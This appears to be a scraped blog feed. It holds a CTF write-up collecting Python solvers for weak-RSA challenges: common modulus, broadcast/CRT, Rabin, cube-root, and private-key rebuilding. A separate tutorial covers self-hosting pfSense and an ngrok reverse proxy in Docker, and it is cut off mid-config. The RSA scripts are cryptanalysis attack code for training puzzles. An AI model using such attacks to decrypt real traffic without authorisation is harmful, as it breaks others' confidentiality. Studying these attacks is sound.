= p * q GCD = gcd(e, phiN) if (GCD == 1):    return &quot;Public exponent is valid.....&quot; d = inverse(e//GCD,phiN) c = pow(c, d, n) plaintext = sympy.root(c, GCD) plaintext = long_to_bytes(plaintext) return plaintextdef main(): p =111052706592359766492182549474994387389169491981939276489132990221393430874991652628482505832745103981784837665110819809096264457329836670397000634684595709283710756727662219358743235400779394350023790569023369287367240988429777113514012101219956479046699448481988253039282406274512111898037689623723478951613 q =146182161315365079136034892629243958871460254472263352847680359868694597466935352294806409849433942550149005978761759458977642785950171998444382137410141550212657953776734166481126376675282041461924529145282451064083351825934453414726557476469773468589060088164379979035597652907191236468744400214917268039573 e = 200 c =7797067792814175554801975939092864905908878472965854967525218347636721153564161093453344819975650594936628697646242713415817737235328825333281389820202851500260665233910426103904874575463134970160306453553794787674331367563821223358610113031883172742577264334021835304931484604571485957116313097395143177603380107508691261081725629713443494783479897404175199621026515502716868988672289887933681890547568860707175288422275073767747544353536862473367590288531216644146154729962448906402712219657000812226637887827912541098992158458173920228864293993030475885461755767069329678218760943185942331149777258713727459739405 plaintext = invalidExponent(p,q,e,c) print plaintextmain()</code></pre><p>solve2.py</p><pre><code class="python">import gmpy2p =111052706592359766492182549474994387389169491981939276489132990221393430874991652628482505832745103981784837665110819809096264457329836670397000634684595709283710756727662219358743235400779394350023790569023369287367240988429777113514012101219956479046699448481988253039282406274512111898037689623723478951613q =146182161315365079136034892629243958871460254472263352847680359868694597466935352294806409849433942550149005978761759458977642785950171998444382137410141550212657953776734166481126376675282041461924529145282451064083351825934453414726557476469773468589060088164379979035597652907191236468744400214917268039573e = 200c =7797067792814175554801975939092864905908878472965854967525218347636721153564161093453344819975650594936628697646242713415817737235328825333281389820202851500260665233910426103904874575463134970160306453553794787674331367563821223358610113031883172742577264334021835304931484604571485957116313097395143177603380107508691261081725629713443494783479897404175199621026515502716868988672289887933681890547568860707175288422275073767747544353536862473367590288531216644146154729962448906402712219657000812226637887827912541098992158458173920228864293993030475885461755767069329678218760943185942331149777258713727459739405# e=pow(2,3)*25e1=25n=p*qd =gmpy2.invert(e1,(p-1)*(q-1))flag8 = pow(c,d,n)print hex(gmpy2.iroot(flag8,(e/e1))[0])[2:].decode(&#39;hex&#39;)</code></pre><h1 id="over"><a href="#over" class="headerlink" title="over"></a>over</h1><p>if something new,I’ll add it</p><p>tips:install gmpy2 in linux</p><pre><code class="bash">conda install gmpy2 -n &lt;your env &gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rsa_of_ctf_1</title>
      <link href="/2018/06/01/rsa-of-ctf-1/"/>
      <url>/2018/06/01/rsa-of-ctf-1/</url>
      
        <content type="html"><![CDATA[<p>IN CTF,Rsa often appears.BUT in ctf it’s usually with Fixed method to solve it.<br>Today,I put all code to here.</p><span id="more"></span><h1 id="1-have-p-q-e-compute-d-or-p-q-e-c-to-decrypte-ciphertext"><a href="#1-have-p-q-e-compute-d-or-p-q-e-c-to-decrypte-ciphertext" class="headerlink" title="1.have p,q,e.compute d or p,q,e,c to decrypte ciphertext"></a>1.have p,q,e.compute d or p,q,e,c to decrypte ciphertext</h1><p>you should note that e should be a prime number</p><pre><code class="python">def computeD(fn, e):    (x, y, r) = extendedGCD(fn, e)    #y maybe &lt; 0, so convert it    if y &lt; 0:        return fn + y    return ydef extendedGCD(a, b):    #a*xi + b*yi = ri    if b == 0:        return (1, 0, a)    #a*x1 + b*y1 = a    x1 = 1    y1 = 0    #a*x2 + b*y2 = b    x2 = 0    y2 = 1    while b != 0:        q = a / b        #ri = r(i-2) % r(i-1)        r = a % b        a = b        b = r        #xi = x(i-2) - q*x(i-1)        x = x1 - q*x2        x1 = x2        x2 = x        #yi = y(i-2) - q*y(i-1)        y = y1 - q*y2        y1 = y2        y2 = y    return(x1, y1, a)c=174351854900966188977904987134427781775272319015132758864873306597577750098226384697676493069934493337172878644704026414143158278061735487156753876228693871133246943987986736376334978394288726798629969739682159093341216933569685433834399066431572596217448890045449452777575588109633903180187737151526697202981068022052927269776042366636567373169048897053407525377739061532954622334926090886616814795353343617608514882733311276797401041432521552887309768062119475432313577704285175154999953744808693060762751860890138121483113217037477525088532442342551435801844941921381421754649633057679452893025326942215634059805893e=65537p=7n=327686759455107101770244900847669909444589048412360834576685246062688127536081099083429267251807434658755027942434088691531411358608813564103474260906760890856572316124720411994944452029909143528618601332276557030331449922914588098651910546381598167047448472663466757577538599646576321101391165156123505615545132362901633176715824845507656500702749953003718520197296421627262166996961876028666789909011002781946123522101211391085819205716356811390841768572223338428099889208616922338336413929957447204562949543074397015746616534379026758490398097163404992258919511999330535101502534548628286576966950951725386015104827q=n/7fn=(p - 1) * (q - 1)d = computeD(fn, e)print(d)m = pow(c, d, n)print(hex(m)[2:-1].decode(&#39;hex&#39;))</code></pre><h1 id="2-factor-N"><a href="#2-factor-N" class="headerlink" title="2. factor N"></a>2. factor N</h1><p>if n&lt;256bit or n have two close number.yafu and <a href="https://factordb.com/">foctordb</a> will be very helpful.<br>Note:yafu in windows or in linux is not same.you can try both of them.</p><h1 id="3-Common-Modulus-Attack"><a href="#3-Common-Modulus-Attack" class="headerlink" title="3. Common Modulus Attack"></a>3. Common Modulus Attack</h1><p>if use the same n to encrypt the same m. Common Modulus Attack is useful.</p><pre><code class="python"># coding=utf-8import stringimport gmpydef egcd(a, b):    if a == 0:        return b, 0, 1    else:        g, y, x = egcd(b % a, a)        return g, x - b // a * y, ydef main():    c1=3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349    c2=5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535    n = 6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249    e1 = 773    e2 = 839    s = egcd(e1, e2)    s1 = s[1]    s2 = s[2]     if s1 &lt; 0:        s1 = -s1        c1 = gmpy.invert(c1, n)    elif s2 &lt; 0:        s2 = -s2        c2 = gmpy.invert(c2, n)     m = pow(c1, s1, n) * pow(c2, s2, n) % n    print(m)    print (&#39;try:&#39;,&#39;&#123;:x&#125;&#39;.format(int(m)).decode(&#39;hex&#39;))    q=[102,108,97,103,123,119,104,101,110,119,101,116,104,105,110,107,105,116,105,115,112,111,115,115,105,98,108,101,125]    s=&quot;&quot;    for i in q:        s+=chr(int(i))    print(s) if __name__ == &#39;__main__&#39;:    main()</code></pre><h1 id="4-Basic-Broadcast-Attack"><a href="#4-Basic-Broadcast-Attack" class="headerlink" title="4. Basic Broadcast Attack"></a>4. Basic Broadcast Attack</h1><p>use the same e to encrypte the same m.</p><pre><code class="python"># coding:utf8from struct import pack,unpackimport zlibimport gmpydef my_parse_number(number):    string = &quot;%x&quot; % number    #if len(string) != 64:    #    return &quot;&quot;    erg = []    while string != &#39;&#39;:        erg = erg + [chr(int(string[:2], 16))]        string = string[2:]    return &#39;&#39;.join(erg)def extended_gcd(a, b):    x,y = 0, 1    lastx, lasty = 1, 0    while b:        a, (q, b) = b, divmod(a,b)        x, lastx = lastx-q*x, x        y, lasty = lasty-q*y, y    return (lastx, lasty, a)def chinese_remainder_theorem(items):  N = 1  for a, n in items:    N *= n  result = 0  for a, n in items:    m = N/n    r, s, d = extended_gcd(n, m)    if d != 1:      N=N/n      continue      #raise &quot;Input not pairwise co-prime&quot;    result += a*s*m  return result % N, Nsessions=[&#123;&quot;c&quot;: 7366067574741171461722065133242916080495505913663250330082747465383676893970411476550748394841437418105312353971095003424322679616940371123028982189502042, &quot;e&quot;: 10, &quot;n&quot;: 25162507052339714421839688873734596177751124036723831003300959761137811490715205742941738406548150240861779301784133652165908227917415483137585388986274803&#125;,&#123;&quot;c&quot;: 21962825323300469151795920289886886562790942771546858500842179806566435767103803978885148772139305484319688249368999503784441507383476095946258011317951461, &quot;e&quot;: 10, &quot;n&quot;: 23976859589904419798320812097681858652325473791891232710431997202897819580634937070900625213218095330766877190212418023297341732808839488308551126409983193&#125;,&#123;&quot;c&quot;: 6569689420274066957835983390583585286570087619048110141187700584193792695235405077811544355169290382357149374107076406086154103351897890793598997687053983, &quot;e&quot;: 10, &quot;n&quot;: 18503782836858540043974558035601654610948915505645219820150251062305120148745545906567548650191832090823482852604346478335353784501076761922605361848703623&#125;,&#123;&quot;c&quot;: 4508246168044513518452493882713536390636741541551805821790338973797615971271867248584379813114125478195284692695928668946553625483179633266057122967547052, &quot;e&quot;: 10, &quot;n&quot;: 23383087478545512218713157932934746110721706819077423418060220083657713428503582801909807142802647367994289775015595100541168367083097506193809451365010723&#125;,&#123;&quot;c&quot;: 22966105670291282335588843018244161552764486373117942865966904076191122337435542553276743938817686729554714315494818922753880198945897222422137268427611672, &quot;e&quot;: 10, &quot;n&quot;: 31775649089861428671057909076144152870796722528112580479442073365053916012507273433028451755436987054722496057749731758475958301164082755003195632005308493&#125;,&#123;&quot;c&quot;: 17963313063405045742968136916219838352135561785389534381262979264585397896844470879023686508540355160998533122970239261072020689217153126649390825646712087, &quot;e&quot;: 10, &quot;n&quot;: 22246342022943432820696190444155665289928378653841172632283227888174495402248633061010615572642126584591103750338919213945646074833823905521643025879053949&#125;,&#123;&quot;c&quot;: 1652417534709029450380570653973705320986117679597563873022683140800507482560482948310131540948227797045505390333146191586749269249548168247316404074014639, &quot;e&quot;: 10, &quot;n&quot;: 25395461142670631268156106136028325744393358436617528677967249347353524924655001151849544022201772500033280822372661344352607434738696051779095736547813043&#125;,&#123;&quot;c&quot;: 15585771734488351039456631394040497759568679429510619219766191780807675361741859290490732451112648776648126779759368428205194684721516497026290981786239352, &quot;e&quot;: 10, &quot;n&quot;: 32056508892744184901289413287728039891303832311548608141088227876326753674154124775132776928481935378184756756785107540781632570295330486738268173167809047&#125;,&#123;&quot;c&quot;: 8965123421637694050044216844523379163347478029124815032832813225050732558524239660648746284884140746788823681886010577342254841014594570067467905682359797, &quot;e&quot;: 10, &quot;n&quot;: 52849766269541827474228189428820648574162539595985395992261649809907435742263020551050064268890333392877173572811691599841253150460219986817964461970736553&#125;,&#123;&quot;c&quot;: 13560945756543023008529388108446940847137853038437095244573035888531288577370829065666320069397898394848484847030321018915638381833935580958342719988978247, &quot;e&quot;: 10, &quot;n&quot;: 30415984800307578932946399987559088968355638354344823359397204419191241802721772499486615661699080998502439901585573950889047918537906687840725005496238621&#125;]data = []for session in sessions:    e=session[&#39;e&#39;]    n=session[&#39;n&#39;]    msg=session[&#39;c&#39;]    data = data + [(msg, n)]print &quot;-&quot; * 80print &quot;Please wait, performing CRT&quot;x, n = chinese_remainder_theorem(data)e=session[&#39;e&#39;]realnum = gmpy.mpz(x).root(e)[0].digits()print my_parse_number(int(realnum))</code></pre><p>tips: usually if e&#x3D;3,choose 3 groups;if e&#x3D;10,choose 7 groups.</p><h1 id="5-use-openssl-to-decrypte"><a href="#5-use-openssl-to-decrypte" class="headerlink" title="5.use openssl to decrypte"></a>5.use openssl to decrypte</h1><h2 id="read-public-pem"><a href="#read-public-pem" class="headerlink" title="read public.pem"></a>read public.pem</h2><p>use openssl</p><pre><code class="bash">openssl rsa -pubin -in pubkey.pem -text -modulus</code></pre><p>or use python</p><pre><code class="python">from Crypto.PublicKey import RSAwith open(&#39;./pubkey.pem&#39;, &#39;r&#39;) as f:    key = RSA.importKey(f)    n = key.n    e = key.e</code></pre><h2 id="generate-the-private-pem"><a href="#generate-the-private-pem" class="headerlink" title="generate the private.pem"></a>generate the private.pem</h2><p>we should use rsatools.py</p><pre><code class="python">#!/usr/bin/env python2import base64, fractions, optparse, randomtry:    import gmpyexcept ImportError as e:    try:        import gmpy2 as gmpy    except ImportError:        raise efrom pyasn1.codec.der import encoderfrom pyasn1.type.univ import *PEM_TEMPLATE = &#39;-----BEGIN RSA PRIVATE KEY-----\n%s-----END RSA PRIVATE KEY-----\n&#39;DEFAULT_EXP = 65537def factor_modulus(n, d, e):    &quot;&quot;&quot;    Efficiently recover non-trivial factors of n    See: Handbook of Applied Cryptography    8.2.2 Security of RSA -&gt; (i) Relation to factoring (p.287)    http://www.cacr.math.uwaterloo.ca/hac/    &quot;&quot;&quot;    t = (e * d - 1)    s = 0    while True:        quotient, remainder = divmod(t, 2)        if remainder != 0:            break        s += 1        t = quotient    found = False    while not found:        i = 1        a = random.randint(1,n-1)        while i &lt;= s and not found:            c1 = pow(a, pow(2, i-1, n) * t, n)            c2 = pow(a, pow(2, i, n) * t, n)            found = c1 != 1 and c1 != (-1 % n) and c2 == 1            i += 1    p = fractions.gcd(c1-1, n)    q = (n / p)    return p, qclass RSA:    def __init__(self, p=None, q=None, n=None, d=None, e=DEFAULT_EXP):        &quot;&quot;&quot;        Initialize RSA instance using primes (p, q)        or modulus and private exponent (n, d)        &quot;&quot;&quot;        self.e = e        if p and q:            assert gmpy.is_prime(p), &#39;p is not prime&#39;            assert gmpy.is_prime(q), &#39;q is not prime&#39;            self.p = p            self.q = q        elif n and d:               self.p, self.q = factor_modulus(n, d, e)        else:            raise ArgumentError(&#39;Either (p, q) or (n, d) must be provided&#39;)        self._calc_values()    def _calc_values(self):        self.n = self.p * self.q        if self.p != self.q:            phi = (self.p - 1) * (self.q - 1)        else:            phi = (self.p ** 2) - self.p        self.d = gmpy.invert(self.e, phi)        # CRT-RSA precomputation        self.dP = self.d % (self.p - 1)        self.dQ = self.d % (self.q - 1)        self.qInv = gmpy.invert(self.q, self.p)    def to_pem(self):        &quot;&quot;&quot;        Return OpenSSL-compatible PEM encoded key        &quot;&quot;&quot;        return (PEM_TEMPLATE % base64.encodestring(self.to_der()).decode()).encode()    def to_der(self):        &quot;&quot;&quot;        Return parameters as OpenSSL compatible DER encoded key        &quot;&quot;&quot;        seq = Sequence()        for x in [0, self.n, self.e, self.d, self.p, self.q, self.dP, self.dQ, self.qInv]:            seq.setComponentByPosition(len(seq), Integer(x))        return encoder.encode(seq)    def dump(self, verbose):        vars = [&#39;n&#39;, &#39;e&#39;, &#39;d&#39;, &#39;p&#39;, &#39;q&#39;]        if verbose:            vars += [&#39;dP&#39;, &#39;dQ&#39;, &#39;qInv&#39;]        for v in vars:            self._dumpvar(v)    def _dumpvar(self, var):        val = getattr(self, var)        parts = lambda s, l: &#39;\n&#39;.join([s[i:i+l] for i in range(0, len(s), l)])        if len(str(val)) &lt;= 40:            print(&#39;%s = %d (%#x)\n&#39; % (var, val, val))        else:            print(&#39;%s =&#39; % var)            print(parts(&#39;%x&#39; % val, 80) + &#39;\n&#39;)if __name__ == &#39;__main__&#39;:    parser = optparse.OptionParser()    parser.add_option(&#39;-p&#39;, dest=&#39;p&#39;, help=&#39;prime&#39;, type=&#39;int&#39;)    parser.add_option(&#39;-q&#39;, dest=&#39;q&#39;, help=&#39;prime&#39;, type=&#39;int&#39;)    parser.add_option(&#39;-n&#39;, dest=&#39;n&#39;, help=&#39;modulus&#39;, type=&#39;int&#39;)    parser.add_option(&#39;-d&#39;, dest=&#39;d&#39;, help=&#39;private exponent&#39;, type=&#39;int&#39;)    parser.add_option(&#39;-e&#39;, dest=&#39;e&#39;, help=&#39;public exponent (default: %d)&#39; % DEFAULT_EXP, type=&#39;int&#39;, default=DEFAULT_EXP)    parser.add_option(&#39;-o&#39;, dest=&#39;filename&#39;, help=&#39;output filename&#39;)    parser.add_option(&#39;-f&#39;, dest=&#39;format&#39;, help=&#39;output format (DER, PEM) (default: PEM)&#39;, type=&#39;choice&#39;, choices=[&#39;DER&#39;, &#39;PEM&#39;], default=&#39;PEM&#39;)    parser.add_option(&#39;-v&#39;, dest=&#39;verbose&#39;, help=&#39;also display CRT-RSA representation&#39;, action=&#39;store_true&#39;, default=False)    try:        (options, args) = parser.parse_args()        if options.p and options.q:            print(&#39;Using (p, q) to initialise RSA instance\n&#39;)            rsa = RSA(p=options.p, q=options.q, e=options.e)        elif options.n and options.d:            print(&#39;Using (n, d) to initialise RSA instance\n&#39;)            rsa = RSA(n=options.n, d=options.d, e=options.e)        else:            parser.print_help()            parser.error(&#39;Either (p, q) or (n, d) needs to be specified&#39;)        rsa.dump(options.verbose)        if options.filename:            print(&#39;Saving %s as %s&#39; % (options.format, options.filename))            if options.format == &#39;PEM&#39;:                data = rsa.to_pem()            elif options.format == &#39;DER&#39;:                data = rsa.to_der()            fp = open(options.filename, &#39;wb&#39;)            fp.write(data)            fp.close()    except optparse.OptionValueError as e:        parser.print_help()        parser.error(e.msg)</code></pre><pre><code class="bash">python rsatools.py -o private.pem -e 65537 -p 285960468890451637935629440372639283459 -q 304008741604601924494328155975272418463</code></pre><h2 id="decrypte"><a href="#decrypte" class="headerlink" title="decrypte"></a>decrypte</h2><pre><code class="bash">openssl rsautl -decrypt -in flag.enc -inkey private.pem</code></pre><h1 id="6-robin"><a href="#6-robin" class="headerlink" title="6.robin"></a>6.robin</h1><p>e&#x3D;2,it change to robin encryption.<br>tips:factor n,and use the python scripts.</p><pre><code class="python">#!/usr/bin/env python# -*- coding: utf-8 -*-from libnum import n2s,s2nfrom gmpy2 import invertn = 0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929Ldef egcd(a, b):  if a == 0:    return (b, 0, 1)  else:    g, y, x = egcd(b % a, a)    return (g, x - (b // a) * y, y)c1 = 463861008715592544541788096958649982380822291993552963661158341083846355706002434243934700644973050350312929747219220890560457890313935777592023703351727593419636777359461171339858607119280562005428366329387881166391098115609145938874628114686795611562877497053809598457912418305834273787716982828673966892511281860557783258533261018387471625613663795007228658816252387085466650755883925526958541825222104147849869543037051564421185564554779540328456839232497404387290624286751566497788567952632360610202764706896626948910002870580127130312643007535939055701346777869816192299596023048076518131526912498284229673371086451392093044296762919642063285989747843447863750040049168164995180248537696839181948713195802142440769355170646676213720809021239439003677117223691298857042248760498034349423407473670451239334072146014950322552189012974940288556937727948167308597745265347385839657632044783493614334001410069910239130566741665106961136354024810810762895951475543242485783800975807492277070656820419568903493214148024889196426647826970230572261314165620636524851460205285978154492707641609544222797219280033396022038053564505730709726626191701076448925166798629160333223816800919504603549706970069896984937227311709903117484219056513c2 = 195927128375915404159831782462849519421997168919281192367229155964060692077108973872052067093830637435252224973106403590960932515038799457446882667747435423710065935543543844413331083110324200262663792099201343806708421236272615410153800048782940883675292129942393866266808892179233016046998828763505477208746508926921965388801062981929590402046412505111940482772986190133625714699124188164875578090687811453005795224867122919491454673337692814426115843867664958620407645606387890667138977076727434377908888216522129550500939598401247647451284377783348961677038054513371331912131036588363741320174543932216775500758772806202930724606218837813090150058942140302970078470023234601410850114012056651579503201865188078915561504282163872927300515159998426449361756610452381205386016234990077066797140322333463064165598646284901334076981455665261664866944699135608136052568226611778555151714388687630634120924870097471977570019937467642561549382597187489391364324926276292677979682469604330880184704070172829714637547167378168252389633223108429705879462848460071858533428563787744545008456341542179870964497696809334435217174394915252063444720170993440241479128761827816861630516781632778764274272389367661890340952041792122059256233164391c2 = invert(c2,n)e1 = 17e2 = 65537s = egcd(e1,e2)s1 = s[1]s2 = s[2]s2 = - s2m = pow(c1, s1, n) * pow(c2, s2, n) % nprint n2s(m)</code></pre><h1 id="7-cube-root"><a href="#7-cube-root" class="headerlink" title="7.cube root"></a>7.cube root</h1><p>if e&#x3D;3,and n is very big,try it.</p><pre><code class="python">#!/usr/bin/env python# -*- coding: utf-8 -*-from libnum import s2n,n2sfrom gmpy2 import irootn = 0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929e = 3c = 545666236924510340010249577709750283325731706774285241719627277546281629429734726717293022303311450772262647904537263500252284243393598944613964442974546950954108203106726282255676706429218187217515454665602130999856741523362906632677988245886500953095201122016935004088287862399317170828388632964668574391252399791901016522260191839164586088073933168096433230663402492577707149742261018318811473591856287943664733276898405984282679026758294364432874973387827086342720762945025346962005339728347282927842299962927871005260338747371451546554777112213044710533502191671159066680035742327279159127279685106716107705888068319962657817786581813767331740609788885735155741039564703781141646102609725965697004923161084032164730408824475517786576979990372940555488021025837456038491436690372760376483602299268887032528766383572923258228355911069631275397149328319966792315903921085816103476508992023873616148326626245855060470294978538631677232260545724075728912626994884533001056079733734460116442499311813113038763837974777469202302071221647473459505245546281400799833123812072606012604323510933244028733287443734697557314202167934768160824072400916728008549350662843995750077421616789178835625661267955774815287104291379928002318796086248i = 1while 1:    res = iroot(c+i*n,3)    if(res[1] == True):        print res        break    if i%10000==0:        print &quot;i=&quot;+str(i)    i = i+1m = res[0]print(n2s(m))</code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ngrok+esxi+pfsense</title>
      <link href="/2018/05/22/ngrok-esxi-pfsense/"/>
      <url>/2018/05/22/ngrok-esxi-pfsense/</url>
      
        <content type="html"><![CDATA[<p>With a thinking,try to make a cloud environment to do my job,that i can use a chromebook for a whole day work.<br>for this,I try to split a 48h128g server to some small server,like windows,kali,centos…<br>there is some question i met</p><blockquote><p>1.I only have 2 IP,how to make all computer can connected the internat<br>2.The server is in Intranet,how can I connected it,it’s better have a high speed<br>3.How can i keep my safe</p></blockquote><span id="more"></span><p>There is the answer for me to deal it</p><blockquote><p>1.use a Soft router to build a NAT,the two ip ,one give to ESXI server ,other give to router.All server by split from ESXI connect to soft route.In this,I choose pfSense<br>2.this is not a different question.It’s easy to use teamviewer,but i don’t want to use it,for one it’s not stable,it’s usually disconneted for 5 min.other is in sometime,it is very slow.<br>3.All things is make by myself,the server for Reverse proxy server is build in docker.If someone use docker Escape loophole,I recognized.Just del the vps,change it.</p></blockquote><p>Start</p><h1 id="Soft-router"><a href="#Soft-router" class="headerlink" title="Soft router"></a>Soft router</h1><p>There is a lot of router to choose,just like PFsense,Routeros,Sophos,Untangle.<br>I select the pfSense-CE-2.4.0-RELEASE-amd64</p><h2 id="download-the-ova-file"><a href="#download-the-ova-file" class="headerlink" title="download the ova file"></a>download the ova file</h2><p>I use <code>pfSense-CE-2.4.0-RELEASE-amd64.ova</code></p><h2 id="Deploy-it"><a href="#Deploy-it" class="headerlink" title="Deploy it"></a>Deploy it</h2><p>In ESXI,deploy the template.You can change the router Configuration,I make it 4h4g.<br><img src="/img/2018/05/23/soft_router_configuration.png" alt="soft_router_configuration"></p><p>you can set it in shell or in web(you should make a computer connected in the nat)<br><img src="/img/2018/05/23/soft_router_shell_setting.png" alt="soft_router_shell_setting"><br><img src="/img/2018/05/23/soft_router_web_setting.png" alt="soft_router_web_setting"></p><h2 id="setting-DNS-in-computer"><a href="#setting-DNS-in-computer" class="headerlink" title="setting DNS in computer"></a>setting DNS in computer</h2><p>I’m sad,beacuse i can’t solve it,I want to make the DNS in router,but failed.</p><h1 id="Connect"><a href="#Connect" class="headerlink" title="Connect"></a>Connect</h1><p>The way to connected should use Reverse proxy,I use ngork.</p><h2 id="update-and-install-docker"><a href="#update-and-install-docker" class="headerlink" title="update and install docker"></a>update and install docker</h2><pre><code>sudo apt-get updatesudo apt-get upgrade -ysudo apt-get install docker.io</code></pre><p>the other useful command for install docker</p><pre><code>yum install docker-ceyum install docker-iosudo apt-get install docker.ce</code></pre><h2 id="pull-docker-images"><a href="#pull-docker-images" class="headerlink" title="pull docker images"></a>pull docker images</h2><p>I choose <code>docker pull hteen/ngrok</code><br>build it</p><pre><code>docker run --rm -it -e DOMAIN=&quot;&lt; your domain &gt;&quot; -v /data/ngrok:/myfiles hteen/ngrok /bin/sh /build.sh</code></pre><p>if you see <code>build ok !</code>,it’s ok,if error,sometimes may be your vps is not support docker.<br><img src="/img/2018/05/23/ngork_budilok.png" alt="ngork_budilok"></p><h2 id="start-docker-images"><a href="#start-docker-images" class="headerlink" title="start docker images"></a>start docker images</h2><p>if you only want to proxy the http or https.You can just use </p><pre><code>docker run -idt --name ngrok-server -v /data/ngrok:/myfiles -p 80:80 -p 443:443 -p 4443:4443 -e DOMAIN=&#39;&lt; your domain &gt;&#39; hteen/ngrok /bin/sh /server.sh</code></pre><p>if you want to proxy ssh or rdp.You should open more ports.<br>just like</p><pre><code>docker run -idt --name ngrok-server -v /data/ngrok:/myfiles -p 80:80 -p 443:443 -p 4443:4443 -p 50001:50001 -p 50002:50002 -p 50003:50003 -p 50004:50004 -p 50005:50005 -p 50006:50006 -p 50007:50007 -p 50008:50008 -p 50009:50009 -p 50010:50010 -p 50011:50011 -p 50012:50012 -p 50013:50013 -p 50014:50014 -p 50015:50015 -p 50016:50016 -p 50017:50017 -p 50018:50018 -p 50019:50019 -p 50020:50020 -p 50021:50021 -p 50022:50022 -p 50023:50023 -p 50024:50024 -p 50025:50025 -p 50026:50026 -p 50027:50027 -p 50028:50028 -p 50029:50029 -p 50030:50030 -p 50031:50031 -p 50032:50032 -p 50033:50033 -p 50034:50034 -p 50035:50035 -p 50036:50036 -p 50037:50037 -p 50038:50038 -p 50039:50039 -p 50040:50040 -p 50041:50041 -p 50042:50042 -p 50043:50043 -p 50044:50044 -p 50045:50045 -p 50046:50046 -p 50047:50047 -p 50048:50048 -p 50049:50049 -p 50050:50050 -p 50051:50051 -p 50052:50052 -p 50053:50053 -p 50054:50054 -p 50055:50055 -p 50056:50056 -p 50057:50057 -p 50058:50058 -p 50059:50059 -p 50060:50060 -p 50061:50061 -p 50062:50062 -p 50063:50063 -p 50064:50064 -p 50065:50065 -p 50066:50066 -p 50067:50067 -p 50068:50068 -p 50069:50069 -p 50070:50070 -p 50071:50071 -p 50072:50072 -p 50073:50073 -p 50074:50074 -p 50075:50075 -p 50076:50076 -p 50077:50077 -p 50078:50078 -p 50079:50079 -p 50080:50080 -p 50081:50081 -p 50082:50082 -p 50083:50083 -p 50084:50084 -p 50085:50085 -p 50086:50086 -p 50087:50087 -p 50088:50088 -p 50089:50089 -p 50090:50090 -p 50091:50091 -p 50092:50092 -p 50093:50093 -p 50094:50094 -p 50095:50095 -p 50096:50096 -p 50097:50097 -p 50098:50098 -p 50099:50099 -p 50100:50100 -e DOMAIN=&#39;&lt; your domain &gt;&#39; hteen/ngrok /bin/sh /server.sh</code></pre><p>it’s too fool,you can use other to replace it</p><pre><code>docker run -idt --name ngrok-server -v /data/ngrok:/myfiles -p 80:80 -p 443:443 -p 4443:4443 -p 50000-50200:50000-50200 -e DOMAIN=&#39;&lt; your domain &gt;&#39; hteen/ngrok /bin/sh /server.sh</code></pre><p>there is something you should be notice.The ports number can’t be too much,I try to open 10000 ports,1000ports,all failed.In the end,I choose 200.</p><h2 id="And-a-dns"><a href="#And-a-dns" class="headerlink" title="And a dns"></a>And a dns</h2><p>in your Domain provider to add two records.<br><img src="/img/2018/05/23/dns1.png" alt="dns1"><br><img src="/img/2018/05/23/dns2.png" alt="dns2"></p><h1 id="USE-mstsc"><a href="#USE-mstsc" class="headerlink" title="USE mstsc"></a>USE mstsc</h1><p>In step 2,we will find a folder bin in &#x2F;data&#x2F;ngork&#x2F;,those are the program to connect to our server.<br>Download them and choose what fit your OS<br>there are linux_x64,win_x64<br>for other,you should use there commands</p><pre><code>sudo GOOS=windowsGOARCH=i386 make release-server release-clientsudo GOOS=darwin GOARCH=i386 make release-server release-client</code></pre><p>create a file named <code>ngork.cfg</code></p><pre><code>server_addr: &quot;&lt; your domain 